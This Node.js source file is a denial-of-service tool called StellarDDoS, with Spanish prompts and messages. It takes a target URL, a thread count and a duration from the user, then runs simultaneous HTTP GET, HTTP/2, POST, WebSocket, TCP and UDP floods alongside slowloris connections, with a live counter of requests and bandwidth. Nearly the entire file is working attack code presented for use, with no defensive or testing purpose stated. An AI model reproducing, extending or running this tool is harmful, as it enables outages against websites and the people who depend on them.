#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes } = require('crypto');

class StellarDDoS {
    constructor() {
        this.stats = { 
            total: 0, 
            success: 0, 
            failed: 0, 
            startTime: 0,
            bandwidth: 0
        };
        this.running = false;
        this.animationChars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
        this.animationIndex = 0;
        this.connections = new Set();
        this.preGeneratedPayloads = {
            http: Buffer.alloc(4096, 'X'),
            tcp: randomBytes(1024),
            udp: Buffer.alloc(65507, 'Z')
        };
    }

    startAttack(target, options = {}) {
        if (this.running) {
            console.log(chalk.red('Ataque ya en ejecución'));
            return;
        }
        
        try {
            const url = new URL(target);
            if (!['http:', 'https:'].includes(url.protocol)) throw new Error();
        } catch {
            console.log(chalk.red('URL inválida!'));
            process.exit(1);
        }

        const config = {
            threads: Math.min(options.threads || 500, 2000),
            duration: options.duration || 30,
            timeout: 2000
        };

        this.running = true;
        this.stats.startTime = performance.now();
        const url = new URL(target);
        
        this.initializeHttpFlood(url, config);
        this.initializeNetworkFlood(url, config);
        
        this.showStats();
        setTimeout(() => this.stop(), config.duration * 1000);
    }

    initializeHttpFlood(url, config) {
        const protocol = url.protocol === 'https:' ? https : http;
        this.agent = new protocol.Agent({ 
            keepAlive: true,
            maxSockets: config.threads * 1000,
            timeout: config.timeout
        });

        for (let i = 0; i < config.threads; i++) {
            this.httpFlood(url, protocol);
            this.http2Flood(url);
            this.httpPostFlood(url, protocol);
            this.websocketFlood(url);
        }
    }

    initializeNetworkFlood(url, config) {
        const udpSocket = dgram.createSocket('udp4');
        udpSocket.on('error', () => {});

        for (let i = 0; i < config.threads; i++) {
            this.tcpFlood(url);
            this.udpFlood(url, udpSocket);
            this.slowloris(url);
        }
    }

    httpFlood(url, protocol) {
        const attack = () => {
            if (!this.running) return;
            
            const req = protocol.request({
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: `/${randomBytes(8).toString('hex')}`,
                method: 'GET',
                agent: this.agent,
                headers: {
                    'User-Agent': 'Mozilla/5.0',
                    'Connection': 'keep-alive',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            });

            req.on('response', res => {
                res.on('data', data => this.stats.bandwidth += data.length);
                res.on('end', () => this.recordSuccess());
            }).on('error', () => this.recordError());

            req.setTimeout(1500, () => req.destroy());
            req.end();
        };

        setInterval(attack, 10);
    }

    http2Flood(url) {
        const attack = () => {
            if (!this.running) return;
            
            const client = http2.connect(url.origin, { maxSessionMemory: 16384 });
            client.on('error', () => client.destroy());

            const req = client.request({
                ':path': `/${randomBytes(8).toString('hex')}`,
                ':method': 'GET'
            });

            req.on('data', data => this.stats.bandwidth += data.length)
               .on('end', () => this.recordSuccess())
               .on('error', () => this.recordError());

            req.end();
        };

        setInterval(attack, 15);
    }

    httpPostFlood(url, protocol) {
        const attack = () => {
            if (!this.running) return;
            
            const req = protocol.request({
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: '/',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/octet-stream',
                    'Content-Length': this.preGeneratedPayloads.http.length,
                    'Connection': 'keep-alive'
                },
                agent: this.agent
            });

            req.write(this.preGeneratedPayloads.http);
            req.on('response', res => {
                res.on('data', data => this.stats.bandwidth += data.length);
                res.on('end', () => this.recordSuccess());
            }).on('error', () => this.recordError());

            req.end();
        };

        setInterval(attack, 20);
    }

    websocketFlood(url) {
        const attack = () => {
            if (!this.running) return;
            
            const ws = new WebSocket(url.origin.replace(/^http/, 'ws'));
            ws.on('open', () => {
                ws.send(this.preGeneratedPayloads.http);
                this.recordSuccess();
                ws.close();
            }).on('error', () => this.recordError());
        };

        setInterval(attack, 25);
    }

    tcpFlood(url) {
        const attack = () => {
            if (!this.running) return;
            
            const socket = new net.Socket();
            this.connections.add(socket);

            socket.connect({
                host: url.hostname,
                port: url.port || 80
            }, () => {
                socket.write(this.preGeneratedPayloads.tcp);
                this.recordSuccess();
                socket.destroy();
            }).on('error', () => this.recordError());
        };

        setInterval(attack, 5);
    }

    udpFlood(url, socket) {
        const attack = () => {
            if (!this.running) return;
            
            socket.send(this.preGeneratedPayloads.udp, url.port || 80, url.hostname, 
                (err) => err ? this.recordError() : this.recordSuccess());
        };

        setInterval(attack, 1);
    }

    slowloris(url) {
        const attack = () => {
            if (!this.running) return;
            
            const socket = net.connect({
                host: url.hostname,
                port: url.port || 80
            });

            socket.write(`GET / HTTP/1.1\r\nHost: ${url.hostname}\r\n`);
            socket.write('Connection: keep-alive\r\n\r\n');

            const keepAlive = setInterval(() => {
                if (!this.running) {
                    clearInterval(keepAlive);
                    return socket.destroy();
                }
                socket.write(`X-Header: ${randomBytes(4).toString('hex')}\r\n`);
            }, 15000);

            socket.on('error', () => clearInterval(keepAlive));
            this.connections.add(socket);
        };

        setInterval(attack, 1000);
    }

    recordSuccess() {
        this.stats.success++;
        this.stats.total++;
    }

    recordError() {
        this.stats.failed++;
        this.stats.total++;
    }

showStats() {
    if (!this.running) return;
    
    const elapsed = (performance.now() - this.stats.startTime) / 1000;
    const rps = elapsed >= 0.1 ? (this.stats.total / elapsed).toFixed(0) : '0';
    const bw = (this.stats.bandwidth / 1024 / 1024).toFixed(2);
    
    const phases = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
    const progressBars = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█'];
    
    const animIndex = Math.floor(elapsed * 10) % phases.length;
    const progressIndex = Math.floor((elapsed % 1) * progressBars.length);
    
    const anim = phases[animIndex];
    const progress = progressBars[progressIndex];
    
    process.stdout.write(chalk`\r\x1b[K{green ${anim}} ` +
        chalk`{white Tiempo:} {greenBright ${elapsed.toFixed(1)}s} ` +
        chalk`{white Solicitudes:} {cyan ${this.stats.total}} ` +
        chalk`{white SPS:} {cyan ${rps}} ` +
        chalk`{white BW:} {cyan ${bw}MB} ` +
        chalk`${progress.repeat(3)} ` +
        chalk`({green ${this.stats.success}}|{red ${this.stats.failed}})`
    );

    setTimeout(() => this.showStats(), 100);
}

    stop() {
        if (!this.running) return;
        this.running = false;

        console.log(chalk`\n\n{yellow [!] Deteniendo ataque...}`);
        
        this.connections.forEach(socket => socket.destroy());
        if (this.agent) this.agent.destroy();
        
        const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
        console.log(chalk.green(`\nAtaque finalizado en ${elapsed}s`));
        console.log(chalk.blue(`Total de peticiones: ${this.stats.total}`));
        console.log(chalk.green(`Éxitos: ${this.stats.success}`) + ' | ' + chalk.red(`Fallidos: ${this.stats.failed}`));
        console.log(chalk.cyan(`Ancho de banda usado: ${(this.stats.bandwidth / 1024 / 1024).toFixed(2)} MB\n`));
        
        process.exit(0);
    }
}

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const stellar = new StellarDDoS();

rl.question(chalk.greenBright('URL objetivo: '), target => {
    rl.question(chalk.greenBright('Número de hilos (500): '), threads => {
        rl.question(chalk.greenBright('Duración (30s): '), duration => {
            stellar.startAttack(target, { 
                threads: parseInt(threads) || 500, 
                duration: parseInt(duration) || 30 
            });
            
            rl.on('line', line => {
                if (line.trim() === 'stop') stellar.stop();
            });
        });
    });
});

rl.on('close', () => stellar.stop());